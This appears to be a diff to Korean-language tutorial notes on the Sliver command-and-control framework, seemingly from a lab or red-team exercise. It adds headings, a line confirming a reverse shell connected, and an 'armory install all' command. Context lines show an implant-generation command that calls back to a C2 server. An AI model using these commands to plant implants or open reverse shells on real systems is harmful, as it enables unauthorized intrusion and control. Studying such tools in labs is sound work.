@@ -22,6 +22,7 @@ sliver
 
 ## How to Use Sliver
 
+#### Session Connection
 ```bash
 # [Sliver] 임플란트 생성 및 Session 서버 생성
 generate --http [C2서버 공인 IP] -s [임플란트 경로 & 파일명] --os [타겟 운영체제] --arch [타겟 아키텍쳐]
@@ -69,4 +70,10 @@ drwx------  root:root  snap            <dir>     Tue Mar 18 13:18:02 +0000 2025
 ```
 <br>
 
-Reverse Shell이 잘 연결됨을 확인할 수 있습니다.
+Reverse Shell이 잘 연결됨을 확인할 수 있습니다.<br><br><br>
+
+#### Attack Simulation
+
+```bash
+armory install all 
+```
